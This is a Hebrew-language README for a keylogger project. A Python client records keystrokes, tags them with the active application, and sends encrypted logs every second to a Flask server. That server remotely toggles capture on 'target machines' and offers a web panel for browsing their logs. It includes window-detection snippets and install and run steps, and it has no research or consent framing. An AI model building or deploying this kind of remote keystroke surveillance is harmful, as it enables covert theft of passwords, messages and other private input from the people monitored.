# Keylogger Management System

# keylogger.py (צד ה-Client)
# - מאזין ללחיצות מקלדת באמצעות pynput, מאגד תווים למילים, משייך לאפליקציה הפעילה ולזמן ושומר בלוגים.
# - כל שנייה שולח לוגים מוצפנים לשרת (/api/upload) באמצעות Fernet.
# - Polling כל 2 שניות לשרת (/api/toggle) כדי לבדוק אם להפעיל/לכבות.
# - רץ כתהליך רקע, ניתן לעצור עם Ctrl+C.

# app.py (צד ה-Server)
# - שרת Flask שמארח API וממשק Web.
# - מקבל נתונים מוצפנים, מפענח ושומר אותם כ-JSON בתיקיות data ו-decrypted_data.
# - API:
#   /api/upload – קליטת לוגים מוצפנים
#   /api/toggle – שליטה במצב לכל מכונה
#   /api/getData/<machine> – החזרת לוגים למכונה
#   /api/getTargetMachinesList – רשימת מכונות
#   /api/deleteLogs/<machine> – מחיקת לוגים
#   /api/addUser /api/deleteUser /api/validateUser – ניהול משתמשים
# - אחסון: בתיקיות data ו-decrypted_data.

# קבצי HTML (Frontend)
# - log_in.html – דף כניסה (הוספה/מחיקה/אימות משתמשים)
# - WebsiteView.html – רשימת מכונות + כפתור התנתקות
# - individualUinit.html – ממשק מכונה: חיפוש לוגים, הצגה, מחיקה ורענון

# זרימת עבודה
# Client שולח → Server מאחסן ומפענח → Web מציג ומנהל
# המערכת רצה במקביל (threading לשליחה, polling והאזנה).

# התאמות macOS / Windows
# ב-keylogger.py בפונקציה get_active_application():
# Windows (מושבת כברירת מחדל, יש להסיר #):
# if platform.system() == "Windows":
#     import win32gui
#     hwnd = win32gui.GetForegroundWindow()
#     return win32gui.GetWindowText(hwnd) or "Unknown"
# נדרש pip install pywin32
#
# macOS (פעיל כברירת מחדל):
# if platform.system() == "Darwin":
#     from AppKit import NSWorkspace
#     active_app = NSWorkspace.sharedWorkspace().activeApplication()
#     return active_app.get("NSApplicationName", "Unknown")
# נדרש pip install pyobjc
#
# אחרת: מוחזר "Unsupported".

# ספריות נדרשות
pip install pynput requests cryptography flask
# macOS בלבד:
pip install pyobjc
# Windows (אם מפעילים קוד Win32):
pip install pywin32

# דרישות מערכת
# Python 3.6 ומעלה

# הוראות הרצה
# צד השרת:
python app.py
# ברירת מחדל: http://127.0.0.1:5000

# צד הלקוח:
python keylogger.py
# במק/לינוקס: אין צורך בשינויים
# ב-Windows: יש להסיר # מהשורות של Windows, להרדים שורות של macOS, ולהתקין pywin32
